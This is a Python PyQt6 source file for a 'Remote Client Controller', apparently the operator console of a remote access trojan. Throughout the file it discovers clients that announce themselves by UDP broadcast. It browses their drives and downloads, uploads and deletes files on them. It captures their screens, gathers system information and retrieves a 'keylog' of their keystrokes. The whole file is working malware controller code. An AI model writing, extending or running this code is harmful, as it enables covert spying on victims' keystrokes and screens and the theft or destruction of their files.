import socket
import threading
import time
import os
import zlib
from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QPushButton, QTextEdit, QLineEdit, QLabel, QListWidget, QFileDialog, QMessageBox, QProgressBar, QScrollArea
)
from PyQt6.QtCore import pyqtSignal, pyqtSlot, QThread, QTimer
import sys
import urllib.parse

class TransferWidget(QWidget):
    def __init__(self, filename, direction="Downloading", parent=None):
        super().__init__(parent)
        layout = QVBoxLayout(self)
        self.label = QLabel(f"{direction}: {filename} (0%)")
        self.label.setStyleSheet("font-weight: bold; color: #333;")
        layout.addWidget(self.label)
        self.progress_bar = QProgressBar()
        self.progress_bar.setMinimum(0)
        self.progress_bar.setMaximum(100)
        self.progress_bar.setValue(0)
        self.progress_bar.setStyleSheet("""
            QProgressBar {
                border: 2px solid #333;
                border-radius: 5px;
                text-align: center;
                height: 25px;
                background-color: #f0f0f0;
                font-size: 14px;
                color: #333;
            }
            QProgressBar::chunk {
                background-color: #4CAF50;
                border-radius: 3px;
            }
        """)
        layout.addWidget(self.progress_bar)

    def update_progress(self, value):
        self.progress_bar.setValue(value)
        direction, filename = self.label.text().split(':')[:2]
        filename = filename.split('(')[0].strip()
        self.label.setText(f"{direction}: {filename} ({value}%)")

    def reset(self):
        self.progress_bar.setValue(0)
        self.label.setText("Transfer Progress: Not active")
        self.setVisible(False)

class DownloadThread(QThread):
    progress_signal = pyqtSignal(int, str)
    log_signal = pyqtSignal(str)
    finished_signal = pyqtSignal(bool, str)

    def __init__(self, client_ip, port, remote_filepath, save_path):
        super().__init__()
        self.client_ip = client_ip
        self.port = port
        self.remote_filepath = remote_filepath
        self.save_path = save_path
        self.filename = os.path.basename(save_path) if save_path else os.path.basename(remote_filepath)
        self.completed = False
        self.max_retries = 5
        self.min_timeout = 20
        self.max_timeout = 1200

    def run(self):
        retry_count = 0
        while retry_count < self.max_retries and not self.completed:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.min_timeout)
                self.log_signal.emit(f"[DEBUG] Connecting to {self.client_ip}:{self.port} (Attempt {retry_count + 1}/{self.max_retries})")
                sock.connect((self.client_ip, self.port))
                cmd = f"{self.remote_filepath}".encode("utf-8")
                sock.sendall(cmd)
                header = sock.recv(64)
                self.log_signal.emit(f"[DEBUG] Received header: {header}")
                if header.startswith(b"[ERROR]"):
                    self.log_signal.emit(f"[ERROR] {header.decode('utf-8')}")
                    if not self.completed:
                        self.completed = True
                        self.finished_signal.emit(False, self.filename)
                    sock.close()
                    return
                if not header.startswith(b"[FILE_SIZE]"):
                    self.log_signal.emit("[ERROR] Invalid file size header")
                    if not self.completed:
                        self.completed = True
                        self.finished_signal.emit(False, self.filename)
                    sock.close()
                    return
                filesize = int(header[len(b"[FILE_SIZE]"):].decode("utf-8"))
                estimated_timeout = max(self.min_timeout, min(filesize / 51200, self.max_timeout))
                sock.settimeout(estimated_timeout)
                self.log_signal.emit(f"[DEBUG] File size: {filesize} bytes, timeout set to {estimated_timeout} seconds")
                sock.sendall(b"ready")
                received = 0
                chunks = []
                start_time = time.time()
                while received < filesize:
                    try:
                        chunk = sock.recv(8192)
                        if not chunk:
                            self.log_signal.emit(f"[ERROR] Connection closed before receiving full file")
                            if not self.completed:
                                self.completed = True
                                self.finished_signal.emit(False, self.filename)
                            break
                        chunks.append(chunk)
                        received += len(chunk)
                        progress = int((received / filesize) * 100)
                        self.progress_signal.emit(progress, self.filename)
                        latency = (time.time() - start_time) * 1000
                        self.log_signal.emit(f"[DEBUG] Received {received}/{filesize} bytes ({progress}%), latency: {latency:.2f} ms")
                        start_time = time.time()
                    except socket.timeout:
                        retry_count += 1
                        self.log_signal.emit(f"[DEBUG] Timeout while receiving data, retrying ({retry_count}/{self.max_retries})...")
                        if retry_count >= self.max_retries:
                            self.log_signal.emit(f"[ERROR] Max retries reached for {self.filename}")
                            if not self.completed:
                                self.completed = True
                                self.finished_signal.emit(False, self.filename)
                            break
                        continue
                    except Exception as e:
                        self.log_signal.emit(f"[ERROR] Error receiving data: {e}")
                        if not self.completed:
                            self.completed = True
                            self.finished_signal.emit(False, self.filename)
                        break
                if received == filesize and not self.completed:
                    self.completed = True
                    compressed_data = b"".join(chunks)
                    try:
                        data = zlib.decompress(compressed_data)
                        with open(self.save_path, "wb") as f:
                            f.write(data)
                        self.log_signal.emit(f"[INFO] File {self.save_path} downloaded and decompressed successfully")
                        self.finished_signal.emit(True, self.filename)
                    except Exception as e:
                        self.log_signal.emit(f"[ERROR] Decompression failed: {e}")
                        self.finished_signal.emit(False, self.filename)
                elif not self.completed:
                    self.log_signal.emit(f"[ERROR] Incomplete file download: {received}/{filesize} bytes")
                    self.finished_signal.emit(False, self.filename)
                sock.close()
                return
            except Exception as e:
                self.log_signal.emit(f"[DEBUG] Error in download: {e}")
                retry_count += 1
                if retry_count >= self.max_retries:
                    self.log_signal.emit(f"[ERROR] Max retries reached for {self.filename}: {e}")
                    if not self.completed:
                        self.completed = True
                        self.finished_signal.emit(False, self.filename)
                try:
                    sock.close()
                except:
                    pass
                time.sleep(2)

class UploadThread(QThread):
    progress_signal = pyqtSignal(int, str)
    log_signal = pyqtSignal(str)
    finished_signal = pyqtSignal(bool, str)

    def __init__(self, client_ip, port, local_filepath, remote_filepath):
        super().__init__()
        self.client_ip = client_ip
        self.port = port
        self.local_filepath = local_filepath
        self.remote_filepath = remote_filepath
        self.filename = os.path.basename(local_filepath)
        self.completed = False
        self.min_timeout = 20
        self.max_timeout = 1200

    def run(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.min_timeout)
            self.log_signal.emit(f"[DEBUG] Connecting to {self.client_ip}:{self.port} for upload")
            sock.connect((self.client_ip, self.port))
            with open(self.local_filepath, "rb") as f:
                data = f.read()
            compressed_data = zlib.compress(data)
            filesize = len(compressed_data)
            encoded_filepath = urllib.parse.quote(self.remote_filepath)
            cmd = f"UPLOAD:{encoded_filepath}:{filesize}".encode("utf-8")
            sock.sendall(cmd)
            response = sock.recv(64).decode("utf-8")
            self.log_signal.emit(f"[DEBUG] Received response: {response}")
            if response != "ready":
                self.log_signal.emit(f"[ERROR] Client not ready: {response}")
                if not self.completed:
                    self.completed = True
                    self.finished_signal.emit(False, self.filename)
                sock.close()
                return
            estimated_timeout = max(self.min_timeout, min(filesize / 51200, self.max_timeout))
            sock.settimeout(estimated_timeout)
            self.log_signal.emit(f"[DEBUG] File size: {filesize} bytes (compressed), timeout set to {estimated_timeout} seconds")
            sent = 0
            start_time = time.time()
            while sent < filesize:
                chunk = compressed_data[sent:sent + 8192]
                if not chunk:
                    break
                sock.sendall(chunk)
                sent += len(chunk)
                progress = int((sent / filesize) * 100)
                self.progress_signal.emit(progress, self.filename)
                latency = (time.time() - start_time) * 1000
                self.log_signal.emit(f"[DEBUG] Sent {sent}/{filesize} bytes ({progress}%), latency: {latency:.2f} ms")
                start_time = time.time()
            response = sock.recv(64).decode("utf-8")
            self.log_signal.emit(f"[DEBUG] Client response: {response}")
            if response == "success" and not self.completed:
                self.completed = True
                self.log_signal.emit(f"[INFO] File {self.remote_filepath} uploaded successfully")
                self.finished_signal.emit(True, self.filename)
            elif not self.completed:
                self.log_signal.emit(f"[ERROR] Upload failed: {response}")
                self.finished_signal.emit(False, self.filename)
            sock.close()
        except Exception as e:
            self.log_signal.emit(f"[DEBUG] Error in upload: {e}")
            if not self.completed:
                self.completed = True
                self.finished_signal.emit(False, self.filename)
            try:
                sock.close()
            except:
                pass

class ServerWindow(QMainWindow):
    log_signal = pyqtSignal(str)
    progress_signal = pyqtSignal(int, str)

    def __init__(self, server):
        super().__init__()
        self.server = server
        self.init_ui()
        self.log_signal.connect(self.append_log)
        self.progress_signal.connect(self.update_progress)
        self.selected_client_ip = None
        self.transfer_widgets = {}
        self.transfer_threads = {}

    def init_ui(self):
        self.setWindowTitle("Remote Client Controller")
        self.setGeometry(100, 100, 800, 600)

        main_widget = QWidget()
        self.setCentralWidget(main_widget)
        layout = QVBoxLayout()
        main_widget.setLayout(layout)

        ip_layout = QHBoxLayout()
        self.ip_label = QLabel("Server IP:")
        self.ip_input = QLineEdit(self.server.host)
        ip_layout.addWidget(self.ip_label)
        ip_layout.addWidget(self.ip_input)
        self.port_label = QLabel("Port:")
        self.port_input = QLineEdit(str(self.server.port))
        ip_layout.addWidget(self.port_label)
        ip_layout.addWidget(self.port_input)
        layout.addLayout(ip_layout)

        manual_ip_layout = QHBoxLayout()
        self.manual_ip_input = QLineEdit()
        self.manual_ip_input.setPlaceholderText("Enter client IP or hostname")
        manual_ip_layout.addWidget(self.manual_ip_input)
        self.add_ip_button = QPushButton("Add Client")
        self.add_ip_button.clicked.connect(self.add_manual_client)
        manual_ip_layout.addWidget(self.add_ip_button)
        layout.addLayout(manual_ip_layout)

        btn_layout = QHBoxLayout()
        self.scan_button = QPushButton("Scan for Clients")
        self.scan_button.clicked.connect(self.scan_clients)
        btn_layout.addWidget(self.scan_button)

        self.connect_button = QPushButton("Connect Client")
        self.connect_button.clicked.connect(self.connect_client)
        self.connect_button.setEnabled(False)
        btn_layout.addWidget(self.connect_button)

        self.disconnect_button = QPushButton("Disconnect Client")
        self.disconnect_button.clicked.connect(self.disconnect_client)
        self.disconnect_button.setEnabled(False)
        btn_layout.addWidget(self.disconnect_button)

        self.view_log_button = QPushButton("View Log File")
        self.view_log_button.clicked.connect(self.view_log_file)
        self.view_log_button.setEnabled(False)
        btn_layout.addWidget(self.view_log_button)

        self.clear_log_button = QPushButton("Clear Log")
        self.clear_log_button.clicked.connect(self.clear_log)
        btn_layout.addWidget(self.clear_log_button)

        layout.addLayout(btn_layout)

        self.client_list = QListWidget()
        self.client_list.itemClicked.connect(self.select_client)
        layout.addWidget(QLabel("Available Clients:"))
        layout.addWidget(self.client_list)

        fb_btn_layout = QHBoxLayout()
        self.show_drive_button = QPushButton("Show Drives")
        self.show_drive_button.clicked.connect(self.show_drives_of_client)
        self.show_drive_button.setEnabled(False)
        fb_btn_layout.addWidget(self.show_drive_button)

        self.upload_button = QPushButton("Upload File")
        self.upload_button.clicked.connect(self.upload_file_to_client)
        self.upload_button.setEnabled(False)
        fb_btn_layout.addWidget(self.upload_button)

        self.delete_button = QPushButton("Delete File")
        self.delete_button.clicked.connect(self.delete_file_from_client)
        self.delete_button.setEnabled(False)
        fb_btn_layout.addWidget(self.delete_button)

        self.screen_capture_button = QPushButton("Screen Capture")
        self.screen_capture_button.clicked.connect(self.capture_screenshot)
        self.screen_capture_button.setEnabled(False)
        fb_btn_layout.addWidget(self.screen_capture_button)

        self.system_info_button = QPushButton("System Info")  # เพิ่มปุ่ม System Info
        self.system_info_button.clicked.connect(self.show_system_info)
        self.system_info_button.setEnabled(False)
        fb_btn_layout.addWidget(self.system_info_button)

        layout.addLayout(fb_btn_layout)

        self.dir_path_input = QLineEdit()
        self.dir_path_input.setPlaceholderText("Current remote path")
        self.dir_path_input.setReadOnly(True)
        layout.addWidget(self.dir_path_input)

        self.dir_list_widget = QListWidget()
        self.dir_list_widget.itemDoubleClicked.connect(self.browse_directory)
        layout.addWidget(QLabel("Remote Directory Listing:"))
        layout.addWidget(self.dir_list_widget)

        self.transfers_scroll = QScrollArea()
        self.transfers_scroll.setWidgetResizable(True)
        self.transfers_scroll.setMinimumHeight(100)
        self.transfers_container = QWidget()
        self.transfers_layout = QVBoxLayout(self.transfers_container)
        self.transfers_scroll.setWidget(self.transfers_container)
        layout.addWidget(QLabel("Active Transfers:"))
        layout.addWidget(self.transfers_scroll)

        self.log_display = QTextEdit()
        self.log_display.setReadOnly(True)
        layout.addWidget(QLabel("Server Log:"))
        layout.addWidget(self.log_display)

        self.status_label = QLabel(f"Server: Not Running | Host: {self.server.host} | Port: {self.server.port}")
        layout.addWidget(self.status_label)

    @pyqtSlot(str)
    def append_log(self, message):
        self.log_display.append(f"[{time.strftime('%H:%M:%S')}] {message}")
        self.log_display.update()
        self.status_label.setText(
            f"Server: {'Running' if self.server.running else 'Not Running'} | Host: {self.server.host} | Port: {self.server.port}"
        )

    @pyqtSlot(int, str)
    def update_progress(self, value, filename):
        if filename in self.transfer_widgets:
            self.transfer_widgets[filename].update_progress(value)
            self.transfers_scroll.update()

    def finished_transfer(self, success, filename):
        if filename in self.transfer_widgets:
            widget = self.transfer_widgets[filename]
            direction = widget.label.text().split(':')[0]
            if success:
                widget.label.setText(f"{direction} completed: {filename}")
                if direction == "Uploading" and self.selected_client_ip and self.dir_path_input.text():
                    self.log_message(f"[INFO] Refreshing directory listing after upload: {self.dir_path_input.text()}")
                    files = self.server.request_list_directory(self.selected_client_ip, self.dir_path_input.text())
                    self.dir_list_widget.clear()
                    self.dir_list_widget.update()
                    for f in files:
                        self.dir_list_widget.addItem(f)
            else:
                widget.label.setText(f"{direction} failed: {filename}")
                QTimer.singleShot(2000, lambda: QMessageBox.critical(self, "Transfer Error", f"{direction} failed for {filename}. Please check network connection or client availability."))
            QTimer.singleShot(2000, lambda: self.cleanup_transfer(filename))
            self.transfers_scroll.update()

    def cleanup_transfer(self, filename):
        if filename in self.transfer_widgets:
            widget = self.transfer_widgets[filename]
            widget.setVisible(False)
            widget.deleteLater()
            del self.transfer_widgets[filename]
        if filename in self.transfer_threads:
            del self.transfer_threads[filename]
        self.transfers_scroll.update()

    def add_manual_client(self):
        ip = self.manual_ip_input.text().strip()
        if ip and ip not in [self.client_list.item(i).text() for i in range(self.client_list.count())]:
            if self.server.ping_client(ip):
                self.client_list.addItem(ip)
                self.log_message(f"[INFO] Manually added client at {ip}")
            else:
                self.log_message(f"[ERROR] Client {ip} is not reachable. Ensure client is running and port {self.server.port} is open.")
                QMessageBox.critical(
                    self, "Invalid IP",
                    f"Client {ip} is not reachable.\n"
                    f"1. Ensure client.py is running on {ip}.\n"
                    f"2. Check firewall settings for port {self.server.port}.\n"
                    f"3. Verify network connectivity (ping {ip})."
                )
        else:
            self.log_message(f"[WARNING] Invalid or duplicate IP: {ip}")
            QMessageBox.warning(self, "Invalid IP", "Please enter a valid and unique IP address")

    def clear_log(self):
        self.log_display.clear()
        self.log_message("[INFO] Log cleared")

    def scan_clients(self):
        self.scan_button.setEnabled(False)
        self.client_list.clear()
        threading.Thread(target=self.server.scan_clients, daemon=True).start()

    def select_client(self, item):
        self.selected_client_ip = item.text()
        self.server.selected_client_ip = item.text()
        self.connect_button.setEnabled(True)
        self.disconnect_button.setEnabled(True)
        self.view_log_button.setEnabled(True)
        self.show_drive_button.setEnabled(True)
        self.upload_button.setEnabled(True)
        self.delete_button.setEnabled(True)
        self.screen_capture_button.setEnabled(True)
        self.system_info_button.setEnabled(True)  # เปิดใช้งานปุ่ม System Info
        self.dir_path_input.setText("")
        self.dir_list_widget.clear()

    def connect_client(self):
        ip = self.selected_client_ip
        if ip:
            if self.server.ping_client(ip):
                self.server.connected_clients[ip] = True
                self.append_log(f"Ready to connect to {ip}")
            else:
                self.append_log(f"[ERROR] Client {ip} is not reachable")
                QMessageBox.critical(
                    self, "Connection Error",
                    f"Client {ip} is not reachable.\n"
                    f"1. Ensure client.py is running on {ip}.\n"
                    f"2. Check firewall settings for port {self.server.port}.\n"
                    f"3. Verify network connectivity (ping {ip})."
                )

    def disconnect_client(self):
        ip = self.selected_client_ip
        if ip:
            self.server.connected_clients.pop(ip, None)
            self.append_log(f"Disconnected from {ip}")

    def view_log_file(self):
        ip = self.selected_client_ip
        if ip:
            log_text = self.server.request_log(ip)
            if log_text.startswith("[ERROR]"):
                self.log_message(f"[ERROR] Failed to retrieve keylog from {ip}: {log_text}")
                QMessageBox.critical(self, "Log Error", f"Failed to retrieve keylog: {log_text}")
            elif not log_text.strip():
                self.log_message(f"[INFO] Keylog from {ip} is empty")
                QMessageBox.information(self, "Log Empty", "Keylog file is empty")
            else:
                self.log_display.append(f"\n--- Keylog from {ip} ---\n{log_text}\n--- End Keylog ---\n")
                self.log_display.update()
                self.log_message(f"[INFO] Retrieved keylog from {ip}")

    def show_drives_of_client(self):
        ip = self.selected_client_ip
        if ip:
            drives = self.server.request_list_drives(ip)
            self.dir_path_input.setText("")
            self.dir_list_widget.clear()
            for d in drives:
                self.dir_list_widget.addItem(d)

    def browse_directory(self, item):
        ip = self.selected_client_ip
        entry = item.text()
        current = self.dir_path_input.text()
        if entry.startswith("[DIR] "):
            path_name = entry[6:]
            if current and not current.endswith("\\"):
                next_path = current + "\\" + path_name
            else:
                next_path = current + path_name
            self.dir_path_input.setText(next_path)
            files = self.server.request_list_directory(ip, next_path)
            self.dir_list_widget.clear()
            self.dir_list_widget.update()
            for f in files:
                self.dir_list_widget.addItem(f)
        elif entry.endswith(":\\") or entry.endswith(":"):
            self.dir_path_input.setText(entry)
            files = self.server.request_list_directory(ip, entry)
            self.dir_list_widget.clear()
            self.dir_list_widget.update()
            for f in files:
                self.dir_list_widget.addItem(f)
        else:
            if current and not current.endswith("\\"):
                filepath = current + "\\" + entry
            else:
                filepath = current + entry
            msg = QMessageBox()
            msg.setWindowTitle("File Action")
            msg.setText(f"Do you want to download or delete {entry}?")
            download_button = msg.addButton("Download", QMessageBox.ButtonRole.AcceptRole)
            delete_button = msg.addButton("Delete", QMessageBox.ButtonRole.DestructiveRole)
            cancel_button = msg.addButton(QMessageBox.StandardButton.Cancel)
            msg.exec()
            if msg.clickedButton() == download_button:
                save_path, _ = QFileDialog.getSaveFileName(self, "Save File As", os.path.basename(filepath))
                if not save_path:
                    self.log_message("[INFO] Download cancelled by user")
                    QMessageBox.information(self, "Cancelled", "Download cancelled")
                    return
                self.start_download(ip, filepath, save_path)
            elif msg.clickedButton() == delete_button:
                self.delete_file_from_client(filepath=filepath)

    def delete_file_from_client(self, filepath=None):
        ip = self.selected_client_ip
        if not ip:
            self.log_message("[WARNING] No client selected for delete")
            QMessageBox.warning(self, "No Client Selected", "Please select a client first")
            return
        if not filepath:
            if not self.dir_path_input.text():
                self.log_message("[WARNING] No directory selected for delete")
                QMessageBox.warning(self, "No Directory Selected", "Please select a directory first")
                return
            selected_items = self.dir_list_widget.selectedItems()
            if not selected_items:
                self.log_message("[WARNING] No file selected for delete")
                QMessageBox.warning(self, "No File Selected", "Please select a file to delete")
                return
            entry = selected_items[0].text()
            if entry.startswith("[DIR] "):
                self.log_message("[WARNING] Cannot delete directory")
                QMessageBox.warning(self, "Invalid Selection", "Cannot delete a directory")
                return
            current = self.dir_path_input.text()
            if current and not current.endswith("\\"):
                filepath = current + "\\" + entry
            else:
                filepath = current + entry
        reply = QMessageBox.question(
            self, "Confirm Delete", f"Are you sure you want to delete {os.path.basename(filepath)}?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
        )
        if reply == QMessageBox.StandardButton.Yes:
            result = self.server.request_delete_file(ip, filepath)
            if result == "success":
                self.log_message(f"[INFO] File {filepath} deleted successfully")
                if self.dir_path_input.text():
                    files = self.server.request_list_directory(ip, self.dir_path_input.text())
                    self.dir_list_widget.clear()
                    self.dir_list_widget.update()
                    for f in files:
                        self.dir_list_widget.addItem(f)
            else:
                self.log_message(f"[ERROR] Failed to delete {filepath}: {result}")
                QMessageBox.critical(self, "Delete Error", f"Failed to delete {filepath}: {result}")

    def capture_screenshot(self):
        ip = self.selected_client_ip
        if not ip:
            self.log_message("[WARNING] No client selected for screen capture")
            QMessageBox.warning(self, "No Client Selected", "Please select a client first")
            return
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        default_filename = f"screenshot_{timestamp}.png"
        save_path, _ = QFileDialog.getSaveFileName(self, "Save Screenshot As", default_filename, "PNG Files (*.png)")
        if not save_path:
            self.log_message("[INFO] Screenshot capture cancelled by user")
            QMessageBox.information(self, "Cancelled", "Screenshot capture cancelled")
            return
        self.start_screenshot(ip, save_path)

    def show_system_info(self):  # เพิ่ม method สำหรับแสดง system info
        ip = self.selected_client_ip
        if not ip:
            self.log_message("[WARNING] No client selected for system info")
            QMessageBox.warning(self, "No Client Selected", "Please select a client first")
            return
        if not self.server.ping_client(ip):
            self.log_message(f"[ERROR] Client {ip} is not reachable. Ensure client is running and port {self.server.port} is open.")
            QMessageBox.critical(
                self, "Connection Error",
                f"Client {ip} is not reachable.\n"
                f"1. Ensure client.py is running on {ip}.\n"
                f"2. Check firewall settings for port {self.server.port}.\n"
                f"3. Verify network connectivity (ping {ip})."
            )
            return
        sys_info = self.server.request_system_info(ip)
        if sys_info.startswith("[ERROR]"):
            self.log_message(f"[ERROR] Failed to retrieve system info from {ip}: {sys_info}")
            QMessageBox.critical(self, "System Info Error", f"Failed to retrieve system info: {sys_info}")
        else:
            self.log_message(f"[INFO] Retrieved system info from {ip}")
            QMessageBox.information(self, f"System Info - {ip}", sys_info)

    def start_download(self, client_ip, remote_filepath, save_path):
        if not self.server.ping_client(client_ip):
            self.log_message(f"[ERROR] Client {client_ip} is not reachable. Ensure client is running and port {self.server.port} is open.")
            QMessageBox.critical(
                self, "Connection Error",
                f"Client {client_ip} is not reachable.\n"
                f"1. Ensure client.py is running on {client_ip}.\n"
                f"2. Check firewall settings for port {self.server.port}.\n"
                f"3. Verify network connectivity (ping {client_ip})."
            )
            return
        filename = os.path.basename(save_path)
        if filename in self.transfer_widgets:
            self.log_message(f"[WARNING] Already transferring {filename}")
            QMessageBox.warning(self, "Duplicate Transfer", f"Already transferring {filename}")
            return
        self.log_message(f"[INFO] Starting download: {filename}")
        transfer_widget = TransferWidget(filename, direction="Downloading")
        self.transfers_layout.addWidget(transfer_widget)
        self.transfer_widgets[filename] = transfer_widget
        self.transfers_scroll.update()
        thread = DownloadThread(client_ip, self.server.port, f"DOWNLOAD:{urllib.parse.quote(remote_filepath)}", save_path)
        thread.progress_signal.connect(self.progress_signal.emit)
        thread.log_signal.connect(self.log_signal.emit)
        thread.finished_signal.connect(self.finished_transfer)
        thread.start()
        self.transfer_threads[filename] = thread

    def start_screenshot(self, client_ip, save_path):
        if not self.server.ping_client(client_ip):
            self.log_message(f"[ERROR] Client {client_ip} is not reachable. Ensure client is running and port {self.server.port} is open.")
            QMessageBox.critical(
                self, "Connection Error",
                f"Client {client_ip} is not reachable.\n"
                f"1. Ensure client.py is running on {client_ip}.\n"
                f"2. Check firewall settings for port {self.server.port}.\n"
                f"3. Verify network connectivity (ping {client_ip})."
            )
            return
        filename = os.path.basename(save_path)
        if filename in self.transfer_widgets:
            self.log_message(f"[WARNING] Already capturing {filename}")
            QMessageBox.warning(self, "Duplicate Capture", f"Already capturing {filename}")
            return
        self.log_message(f"[INFO] Starting screenshot capture: {filename}")
        transfer_widget = TransferWidget(filename, direction="Capturing")
        self.transfers_layout.addWidget(transfer_widget)
        self.transfer_widgets[filename] = transfer_widget
        self.transfers_scroll.update()
        thread = DownloadThread(client_ip, self.server.port, "SCREENSHOT", save_path)
        thread.progress_signal.connect(self.progress_signal.emit)
        thread.log_signal.connect(self.log_signal.emit)
        thread.finished_signal.connect(self.finished_transfer)
        thread.start()
        self.transfer_threads[filename] = thread

    def upload_file_to_client(self):
        ip = self.selected_client_ip
        if not ip:
            self.log_message("[WARNING] No client selected for upload")
            QMessageBox.warning(self, "No Client Selected", "Please select a client first")
            return
        local_filepath, _ = QFileDialog.getOpenFileName(self, "Select File to Upload")
        if not local_filepath:
            self.log_message("[INFO] Upload cancelled by user")
            QMessageBox.information(self, "Cancelled", "Upload cancelled")
            return
        current_dir = self.dir_path_input.text()
        if not current_dir:
            self.log_message("[WARNING] No remote directory selected for upload")
            QMessageBox.warning(self, "No Directory Selected", "Please select a remote directory first")
            return
        filename = os.path.basename(local_filepath)
        remote_filepath = os.path.join(current_dir, filename).replace("/", "\\")
        self.start_upload(ip, local_filepath, remote_filepath)

    def start_upload(self, client_ip, local_filepath, remote_filepath):
        if not self.server.ping_client(client_ip):
            self.log_message(f"[ERROR] Client {client_ip} is not reachable. Ensure client is running and port {self.server.port} is open.")
            QMessageBox.critical(
                self, "Connection Error",
                f"Client {client_ip} is not reachable.\n"
                f"1. Ensure client.py is running on {client_ip}.\n"
                f"2. Check firewall settings for port {self.server.port}.\n"
                f"3. Verify network connectivity (ping {client_ip})."
            )
            return
        filename = os.path.basename(local_filepath)
        if filename in self.transfer_widgets:
            self.log_message(f"[WARNING] Already transferring {filename}")
            QMessageBox.warning(self, "Duplicate Transfer", f"Already transferring {filename}")
            return
        self.log_message(f"[INFO] Starting upload: {filename}")
        transfer_widget = TransferWidget(filename, direction="Uploading")
        self.transfers_layout.addWidget(transfer_widget)
        self.transfer_widgets[filename] = transfer_widget
        self.transfers_scroll.update()
        thread = UploadThread(client_ip, self.server.port, local_filepath, remote_filepath)
        thread.progress_signal.connect(self.progress_signal.emit)
        thread.log_signal.connect(self.log_signal.emit)
        thread.finished_signal.connect(self.finished_transfer)
        thread.start()
        self.transfer_threads[filename] = thread

    def log_message(self, message):
        self.log_signal.emit(message)

class Server:
    def __init__(self, host="0.0.0.0", port=12345):
        self.host = host
        self.port = port
        self.server_socket = None
        self.running = False
        self.selected_client_ip = None
        self.connected_clients = {}
        self.app = QApplication(sys.argv)
        self.window = ServerWindow(self)
        self.window.log_message(f"Initializing server with host={host}, port={port}")

    def ping_client(self, client_ip):
        max_retries = 3
        for attempt in range(max_retries):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                self.window.log_message(f"[DEBUG] Pinging {client_ip} (Attempt {attempt + 1}/{max_retries})")
                sock.connect((client_ip, self.port))
                sock.close()
                return True
            except Exception as e:
                self.window.log_message(f"[DEBUG] Ping failed for {client_ip}: {e}")
                if attempt < max_retries - 1:
                    time.sleep(1)
                continue
        self.window.log_message(f"[ERROR] Failed to ping {client_ip} after {max_retries} attempts")
        return False

    def scan_clients(self):
        self.window.log_message("Listening for client broadcasts on port 12346...")
        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udp_socket.bind(("", 12346))
        udp_socket.settimeout(10)
        found_ips = set()
        start_time = time.time()
        try:
            while time.time() - start_time < 10:
                try:
                    data, addr = udp_socket.recvfrom(1024)
                    if data == b"CLIENT_ALIVE":
                        ip = addr[0]
                        if ip not in found_ips and self.ping_client(ip):
                            found_ips.add(ip)
                            self.window.client_list.addItem(ip)
                            self.window.log_message(f"Found client at {ip}")
                except socket.timeout:
                    continue
        finally:
            udp_socket.close()
            self.window.log_message("Scan completed")
            self.window.scan_button.setEnabled(True)

    def request_log(self, client_ip):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(20)
            sock.connect((client_ip, self.port))
            sock.sendall(b"GET_LOG")
            sock.settimeout(30)
            chunks = []
            while True:
                try:
                    data = sock.recv(8192)
                    if not data:
                        break
                    chunks.append(data)
                    if len(data) < 8192:
                        break
                except socket.timeout:
                    self.window.log_message(f"[DEBUG] Timeout while receiving log from {client_ip}")
                    break
            content = b"".join(chunks).decode("utf-8", errors="replace")
            sock.close()
            return content
        except Exception as e:
            self.window.log_message(f"[DEBUG] Error requesting log from {client_ip}: {e}")
            return f"[ERROR] {e}"

    def request_list_drives(self, client_ip):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(20)
            sock.connect((client_ip, self.port))
            sock.sendall(b"LIST_DRIVE")
            sock.settimeout(30)
            chunks = []
            while True:
                try:
                    data = sock.recv(8192)
                    if not data:
                        break
                    chunks.append(data)
                    if len(data) < 8192:
                        break
                except socket.timeout:
                    break
            drives = b"".join(chunks).decode("utf-8", errors="replace")
            sock.close()
            return [x for x in drives.strip().split('\n') if x]
        except Exception as e:
            self.window.log_message(f"Error listing drives from {client_ip}: {e}")
            return []

    def request_list_directory(self, client_ip, path):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(20)
            sock.connect((client_ip, self.port))
            cmd = f"LIST_DIR:{urllib.parse.quote(path)}".encode("utf-8")
            sock.sendall(cmd)
            sock.settimeout(30)
            chunks = []
            while True:
                try:
                    data = sock.recv(8192)
                    if not data:
                        break
                    chunks.append(data)
                    if len(data) < 8192:
                        break
                except socket.timeout:
                    break
            content = b"".join(chunks).decode("utf-8", errors="replace")
            sock.close()
            return [x for x in content.strip().split('\n') if x]
        except Exception as e:
            self.window.log_message(f"Error listing directory from {client_ip}: {e}")
            return []

    def request_delete_file(self, client_ip, filepath):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(20)
            sock.connect((client_ip, self.port))
            cmd = f"DELETE:{urllib.parse.quote(filepath)}".encode("utf-8")
            sock.sendall(cmd)
            sock.settimeout(20)
            response = sock.recv(64).decode("utf-8", errors="replace")
            sock.close()
            return response
        except Exception as e:
            self.window.log_message(f"[DEBUG] Error deleting file from {client_ip}: {e}")
            return f"[ERROR] {e}"

    def request_system_info(self, client_ip):  # เพิ่ม method สำหรับดึง system info
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(20)
            sock.connect((client_ip, self.port))
            sock.sendall(b"SYSTEM_INFO")
            sock.settimeout(30)
            chunks = []
            while True:
                try:
                    data = sock.recv(8192)
                    if not data:
                        break
                    chunks.append(data)
                    if len(data) < 8192:
                        break
                except socket.timeout:
                    self.window.log_message(f"[DEBUG] Timeout while receiving system info from {client_ip}")
                    break
            content = b"".join(chunks).decode("utf-8", errors="replace")
            sock.close()
            return content
        except Exception as e:
            self.window.log_message(f"[DEBUG] Error requesting system info from {client_ip}: {e}")
            return f"[ERROR] {e}"

    def start_server(self):
        pass

if __name__ == "__main__":
    try:
        server = Server(host="0.0.0.0", port=12345)
        server.window.show()
        sys.exit(server.app.exec())
    except Exception as e:
        print(f"Server startup failed: {e}")